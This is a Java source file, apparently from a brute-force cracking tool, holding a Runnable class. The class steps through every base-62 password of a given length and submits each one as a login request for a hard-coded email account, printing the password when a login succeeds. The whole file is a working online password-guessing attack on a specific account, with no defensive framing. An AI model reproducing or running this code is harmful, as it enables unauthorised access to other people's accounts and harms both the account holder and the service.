package main;

/**
 * Created by dengrong on 2016/1/4.
 */
public class Run2 implements Runnable {
    private int num;
    public Run2(int num){
        this.num = num;
    }
    public void run() {
        Radix62 radix62 = new Radix62(num);
        String password = "";
        while(!radix62.isEnd()){
            password = "";
            int[] positions = radix62.getPositions();
            for(int i=0;i<num;i++){
                password+=Main.getChar(positions[i]);
            }
            System.out.println("test password:"+password);
            String param = "syscheckcode=7d729bf70be09a8728cc8ee8bf7052a7c61faff7&username=sishan783173fd@163.com&password="+password+"&product=other";
            if(HttpRequest.login(Main.url,param)){
                System.out.println("----------------------------");
                System.out.println("get password:"+password);
                System.out.println("-----------------------------");
                System.exit(0);
                break;
            }
            radix62.inc();
        }

    }
}
